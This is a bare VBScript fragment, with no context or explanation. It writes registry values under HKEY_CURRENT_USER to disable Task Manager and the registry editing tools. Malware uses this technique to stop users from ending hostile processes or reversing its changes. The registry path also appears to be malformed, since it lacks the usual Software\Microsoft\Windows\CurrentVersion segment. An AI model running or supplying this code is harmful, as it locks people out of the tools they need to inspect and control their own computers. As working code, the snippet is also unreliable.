Set shell = CreateObject("WScript.Shell")
shell.RegWrite "HKEY_CURRENT_USER\Policies\System\DisableTaskMgr", 1, "REG_DWORD"
shell.RegWrite "HKEY_CURRENT_USER\Policies\System\DisableRegistryTools", 1, "REG_DWORD"
